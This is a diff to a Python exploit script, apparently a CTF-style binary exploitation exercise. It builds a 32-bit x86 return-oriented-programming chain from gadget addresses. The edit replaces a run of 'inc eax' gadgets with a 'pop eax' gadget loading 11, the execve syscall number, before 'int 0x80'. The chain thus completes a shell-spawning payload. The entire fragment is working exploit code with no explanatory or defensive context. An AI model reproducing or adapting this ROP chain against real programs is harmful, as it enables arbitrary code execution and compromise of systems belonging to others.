@@ -35,18 +35,8 @@ p += pack('<I', 0x0812b35b) # pop ecx ; ret
 p += pack('<I', 0x08139068) # @ .data + 8
 p += pack('<I', 0x0808522a) # pop edx ; ret
 p += pack('<I', 0x08139068) # @ .data + 8
-p += pack('<I', 0x08048ac1) # xor eax, eax ; ret
-p += pack('<I', 0x080ce61f) # inc eax ; ret
-p += pack('<I', 0x080ce61f) # inc eax ; ret
-p += pack('<I', 0x080ce61f) # inc eax ; ret
-p += pack('<I', 0x080ce61f) # inc eax ; ret
-p += pack('<I', 0x080ce61f) # inc eax ; ret
-p += pack('<I', 0x080ce61f) # inc eax ; ret
-p += pack('<I', 0x080ce61f) # inc eax ; ret
-p += pack('<I', 0x080ce61f) # inc eax ; ret
-p += pack('<I', 0x080ce61f) # inc eax ; ret
-p += pack('<I', 0x080ce61f) # inc eax ; ret
-p += pack('<I', 0x080ce61f) # inc eax ; ret
+p += pack('<I', 0x080f1016) # pop eax ; ret
+p += pack('<I', 11)
 p += pack('<I', 0x08074ded) # int 0x80
 
 
